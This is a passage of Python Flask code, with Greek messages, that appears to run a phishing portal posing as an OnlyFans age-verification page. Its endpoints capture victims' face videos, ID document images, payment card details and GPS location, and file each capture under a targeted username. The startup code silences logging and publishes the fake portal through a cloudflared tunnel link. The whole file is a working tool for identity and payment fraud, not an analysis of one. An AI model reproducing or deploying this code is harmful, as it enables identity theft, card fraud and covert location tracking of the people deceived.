@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'άγνωστο')
            target_username = data.get('target_username', 'άγνωστο')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"onlyfans_face_{target_username}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'face_verification', filename)
            
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_verification', f"metadata_{target_username}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'face_verification',
                'target_username': target_username,
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'onlyfans',
                'verification_type': 'age_verification'
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση προσώπου OnlyFans: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης προσώπου: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_id_verification', methods=['POST'])
def submit_id_verification():
    try:
        session_id = request.form.get('session_id', 'άγνωστο')
        target_username = request.form.get('target_username', 'άγνωστο')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        
        id_filename = None
        if 'id_file' in request.files:
            id_file = request.files['id_file']
            if id_file.filename:
                file_ext = id_file.filename.split('.')[-1] if '.' in id_file.filename else 'jpg'
                id_filename = f"onlyfans_id_{target_username}_{session_id}_{timestamp}.{file_ext}"
                id_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', id_filename)
                id_file.save(id_path)
        
        metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{target_username}_{session_id}_{timestamp}.json")
        metadata = {
            'id_file': id_filename,
            'type': 'id_verification',
            'target_username': target_username,
            'session_id': session_id,
            'timestamp': request.form.get('timestamp', datetime.now().isoformat()),
            'platform': 'onlyfans',
            'verification_type': 'age_verification'
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Αποθηκεύτηκε έγγραφο ταυτότητας OnlyFans: {id_filename}")
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης ταυτότητας: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_payment_verification', methods=['POST'])
def submit_payment_verification():
    try:
        data = request.get_json()
        if data and 'card_number' in data:
            session_id = data.get('session_id', 'άγνωστο')
            target_username = data.get('target_username', 'άγνωστο')
            
            # Μασκάρισμα αριθμού κάρτας για αποθήκευση
            card_number = data.get('card_number', '')
            masked_card = card_number[-4:] if len(card_number) >= 4 else card_number
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"onlyfans_payment_{target_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'payment_data', filename)
            
            payment_data = {
                'type': 'payment_verification',
                'target_username': target_username,
                'session_id': session_id,
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'onlyfans',
                'verification_type': 'age_verification',
                'payment_info': {
                    'card_last_four': masked_card,
                    'expiry_date': data.get('expiry_date', ''),
                    'amount': data.get('amount', '1.00'),
                    'zip_code': data.get('zip_code', '')
                },
                'verification_result': 'pending',
                'note': 'Προσωρινή χρέωση για επαλήθευση ηλικίας'
            }
            
            with open(file_path, 'w') as f:
                json.dump(payment_data, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση πληρωμής OnlyFans: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης πληρωμής: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'άγνωστο')
            target_username = data.get('target_username', 'άγνωστο')
            
            # Επεξεργασία τοποθεσίας στο παρασκήνιο
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Λήφθηκαν δεδομένα τοποθεσίας OnlyFans: {session_id}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης τοποθεσίας: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'άγνωστο')
            target_username = data.get('target_username', 'άγνωστο')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"onlyfans_complete_{target_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            data['received_at'] = datetime.now().isoformat()
            data['platform'] = 'onlyfans'
            data['verification_type'] = 'age_verification'
            data['age_verified'] = True
            data['adult_content_access'] = True
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Αποθηκεύτηκε σύνοψη επαλήθευσης OnlyFans: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης σύνοψης επαλήθευσης: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    check_dependencies()
    
    # Λήψη ρυθμίσεων επαλήθευσης
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4047
    script_name = "OnlyFans Επαλήθευση Ηλικίας"
    
    print("\n" + "="*60)
    print("ΠΥΛΗ ΕΠΑΛΗΘΕΥΣΗΣ ΗΛΙΚΙΑΣ ONLYFANS")
    print("="*60)
    print(f"[+] Δημιουργός: @{VERIFICATION_SETTINGS['target_username']}")
    print(f"[+] Συνδρομή: {VERIFICATION_SETTINGS['subscription_price']}/μήνα")
    print(f"[+] Ακόλουθοι: {VERIFICATION_SETTINGS['follower_count']:,}")
    print(f"[+] Τύπος Περιεχομένου: {VERIFICATION_SETTINGS['content_type']}")
    print(f"[+] Μέθοδος Επαλήθευσης Ηλικίας: {VERIFICATION_SETTINGS['age_method'].upper()}")
    
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"[+] Εικόνα Προφίλ: {VERIFICATION_SETTINGS['profile_picture_filename']}")
    
    print(f"\n[+] Φάκελος δεδομένων: {DOWNLOAD_FOLDER}")
    
    if VERIFICATION_SETTINGS['face_enabled']:
        print(f"[+] Επαλήθευση προσώπου: Ενεργοποιημένη ({VERIFICATION_SETTINGS['face_duration']}s)")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"[+] Επαλήθευση ταυτότητας: Ενεργοποιημένη")
    if VERIFICATION_SETTINGS['payment_enabled']:
        print(f"[+] Επαλήθευση πληρωμής: Ενεργοποιημένη ({VERIFICATION_SETTINGS['payment_amount']}€)")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Επαλήθευση τοποθεσίας: Ενεργοποιημένη")
    
    print("\n[+] Εκκίνηση πύλης επαλήθευσης ηλικίας OnlyFans...")
    print("[+] Πατήστε Ctrl+C για διακοπή.\n")
    
    print("="*60)
    print("ΑΠΑΙΤΕΙΤΑΙ ΕΠΑΛΗΘΕΥΣΗ ΗΛΙΚΙΑΣ ONLYFANS")
    print("="*60)
    print(f"👑 Δημιουργός: @{VERIFICATION_SETTINGS['target_username']}")
    print(f"💎 Συνδρομή: {VERIFICATION_SETTINGS['subscription_price']}/μήνα")
    print(f"👥 Ακόλουθοι: {VERIFICATION_SETTINGS['follower_count']:,}")
    print(f"🔞 Περιεχόμενο: {VERIFICATION_SETTINGS['content_type']}")
    print(f"⚠️  ΑΠΑΙΤΗΣΗ: Επαλήθευση ηλικίας (18+) απαιτείται από το νόμο")
    print(f"🔐 ΜΕΘΟΔΟΣ: {VERIFICATION_SETTINGS['age_method'].replace('_', ' ').title()}")
    if VERIFICATION_SETTINGS['payment_enabled']:
        print(f"💳 ΠΛΗΡΩΜΗ: {VERIFICATION_SETTINGS['payment_amount']}€ προσωρινή χρέωση")
    print("="*60)
    print("Ανοίξτε τον παρακάτω σύνδεσμο στο πρόγραμμα περιήγησης για να επαληθεύσετε την ηλικία...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\n[+] Τερματισμός πύλης επαλήθευσης OnlyFans...")
        sys.exit(0)